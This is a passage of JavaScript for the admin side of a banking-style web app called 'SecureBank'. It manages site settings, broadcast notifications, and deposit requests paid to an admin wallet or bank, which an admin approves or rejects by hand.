    saveAdminData(admin);
    return { ok: true };
}

function getWebsiteSettings() {
    const admin = getAdminData();
    const ws = admin.websiteSettings || DEFAULT_WEBSITE_SETTINGS;
    return {
        siteName: ws.siteName || DEFAULT_WEBSITE_SETTINGS.siteName,
        siteTagline: ws.siteTagline || DEFAULT_WEBSITE_SETTINGS.siteTagline,
        supportEmail: ws.supportEmail || DEFAULT_WEBSITE_SETTINGS.supportEmail,
        announcement: ws.announcement || "",
        maintenanceMode: !!ws.maintenanceMode
    };
}

function updateWebsiteSettings(updates) {
    const admin = getAdminData();
    if (!admin.websiteSettings) {
        admin.websiteSettings = Object.assign({}, DEFAULT_WEBSITE_SETTINGS);
    }
    if (updates.siteName !== undefined) {
        admin.websiteSettings.siteName = String(updates.siteName).trim() || DEFAULT_WEBSITE_SETTINGS.siteName;
    }
    if (updates.siteTagline !== undefined) {
        admin.websiteSettings.siteTagline = String(updates.siteTagline).trim() || DEFAULT_WEBSITE_SETTINGS.siteTagline;
    }
    if (updates.supportEmail !== undefined) {
        admin.websiteSettings.supportEmail = String(updates.supportEmail).trim() || DEFAULT_WEBSITE_SETTINGS.supportEmail;
    }
    if (updates.announcement !== undefined) {
        admin.websiteSettings.announcement = String(updates.announcement).trim();
    }
    if (updates.maintenanceMode !== undefined) {
        admin.websiteSettings.maintenanceMode = !!updates.maintenanceMode;
    }
    saveAdminData(admin);
    return { ok: true, settings: getWebsiteSettings() };
}

function sendAdminNotification(target, message) {
    message = String(message || "").trim();
    if (!message) {
        return { ok: false, error: "Notification message is required." };
    }

    const isBroadcast = target === "all";
    const key = normalizeEmail(target);

    if (!isBroadcast && !getAccount(key)) {
        return { ok: false, error: "User not found." };
    }

    const recipients = isBroadcast ? Object.keys(getAllAccounts()) : [key];
    let count = 0;
    const sentAt = new Date().toISOString();

    recipients.forEach(function(email, index) {
        const account = getAccount(email);
        if (!account) return;
        ensureNotifications(account);
        account.notifications.unshift({
            id: Date.now() + index + Math.random(),
            message: message,
            time: sentAt,
            read: false,
            fromAdmin: true
        });
        if (account.notifications.length > 30) {
            account.notifications = account.notifications.slice(0, 30);
        }
        saveAccount(email, account);
        count++;
    });

    const admin = getAdminData();
    if (!admin.notificationLog) admin.notificationLog = [];
    admin.notificationLog.unshift({
        id: Date.now(),
        target: isBroadcast ? "All users" : key,
        message: message,
        recipientCount: count,
        date: new Date().toLocaleString()
    });
    if (admin.notificationLog.length > 50) {
        admin.notificationLog = admin.notificationLog.slice(0, 50);
    }
    saveAdminData(admin);

    return { ok: true, count: count };
}

function getAdminNotificationLog() {
    return getAdminData().notificationLog || [];
}

function getPendingDeposits() {
    return (getAdminData().pendingDeposits || []).filter(function(d) {
        return d.status === "pending";
    });
}

function getUserPendingDeposits(userEmail) {
    return getPendingDeposits().filter(function(d) {
        return d.userEmail === normalizeEmail(userEmail);
    });
}

function submitDepositRequest(userEmail, amount, method) {
    const key = normalizeEmail(userEmail);
    const account = getAccount(key);
    if (!account) {
        return { ok: false, error: "Account not found." };
    }

    amount = parseFloat(amount);
    if (!amount || amount <= 0) {
        return { ok: false, error: "Enter a valid amount." };
    }

    if (!isDepositMethodEnabled(method)) {
        const info = DEPOSIT_METHODS[method];
        return { ok: false, error: info ? info.unavailable : "This payment method is unavailable." };
    }

    const admin = getAdminData();
    const userName = account.profile ? account.profile.fullName : key;
    const payTo = method === "crypto"
        ? getAdminWalletAddress()
        : method === "bank"
            ? getAdminBankDetails()
            : "SecureBank Admin Merchant";

    const deposit = {
        id: "dep-" + Date.now() + Math.random().toString(36).slice(2, 7),
        userEmail: key,
        userName: userName,
        amount: amount,
        method: method,
        payTo: payTo,
        status: "pending",
        requestedAt: new Date().toISOString(),
        date: new Date().toLocaleString()
    };

    admin.pendingDeposits.unshift(deposit);
    saveAdminData(admin);

    if (!account.pendingDeposits) account.pendingDeposits = [];
    account.pendingDeposits.push({
        id: deposit.id, amount: amount, method: method, payTo: payTo, status: "pending", date: deposit.date
    });

    account.transactions.unshift({
        date: deposit.date,
        description: method === "crypto"
            ? "Deposit Request (Pending) — crypto → " + payTo
            : "Deposit Request (Pending) — " + method + " → Admin",
        amount: 0
    });
    account.notifications.unshift({
        id: Date.now() + Math.random(),
        message: method === "crypto"
            ? "BTC deposit of $" + amount.toFixed(2) + " submitted — send to " + payTo + ". Awaiting admin approval."
            : "Deposit of $" + amount.toFixed(2) + " submitted — awaiting admin approval before funds are credited.",
        time: new Date().toISOString(),
        read: false
    });
    if (account.notifications.length > 30) {
        account.notifications = account.notifications.slice(0, 30);
    }

    saveAccount(key, account);
    return { ok: true, deposit: deposit, payTo: payTo };
}

function resolveDepositOnAccount(userEmail, depositId, message) {
    const account = getAccount(userEmail);
    if (!account) return;

    if (account.pendingDeposits) {
        account.pendingDeposits = account.pendingDeposits.filter(function(d) {
            return d.id !== depositId;
        });
    }

    account.notifications.unshift({
        id: Date.now() + Math.random(),
        message: message,
        time: new Date().toISOString(),
        read: false
    });
    if (account.notifications.length > 30) {
        account.notifications = account.notifications.slice(0, 30);
    }

    saveAccount(userEmail, account);
}

function approveDeposit(depositId) {
    const admin = getAdminData();
    const deposit = (admin.pendingDeposits || []).find(function(d) {
        return d.id === depositId && d.status === "pending";
    });
    if (!deposit) {
        return { ok: false, error: "Deposit request not found." };
    }

    const account = getAccount(deposit.userEmail);
    if (!account) {
        return { ok: false, error: "User account not found." };
    }

    account.cash += deposit.amount;
    account.transactions.unshift({
        date: new Date().toLocaleString(),
        description: "Deposit Approved (" + deposit.method + ") — paid to admin",
        amount: deposit.amount
    });

    deposit.status = "approved";
    deposit.resolvedAt = new Date().toLocaleString();

    sendDepositApprovedEmail(account, deposit.userEmail, deposit.amount, deposit.method);
    saveAccount(deposit.userEmail, account);
    recordUserPayment(deposit.userEmail, "deposit", deposit.amount, deposit.method);
    saveAdminData(admin);

    resolveDepositOnAccount(
        deposit.userEmail,
        depositId,
        "Your deposit of $" + deposit.amount.toFixed(2) + " was approved and credited — check your email for confirmation"
    );

    return { ok: true, emailQueued: true };
}

function rejectDeposit(depositId, reason) {
    const admin = getAdminData();
    const deposit = (admin.pendingDeposits || []).find(function(d) {
        return d.id === depositId && d.status === "pending";
    });
    if (!deposit) {
        return { ok: false, error: "Deposit request not found." };
    }

    deposit.status = "rejected";
    deposit.resolvedAt = new Date().toLocaleString();
    deposit.rejectReason = reason || "Rejected by admin";

    const accountTx = getAccount(deposit.userEmail);
    if (accountTx) {
        accountTx.transactions.unshift({
            date: new Date().toLocaleString(),
            description: "Deposit Rejected (" + deposit.method + ")",
            amount: 0
        });
        saveAccount(deposit.userEmail, accountTx);
    }

    saveAdminData(admin);

    resolveDepositOnAccount(
        deposit.userEmail,
        depositId,
        "Your deposit of $" + deposit.amount.toFixed(2) + " was rejected" +
            (reason ? ": " + reason : "")
    );

    return { ok: true };
}
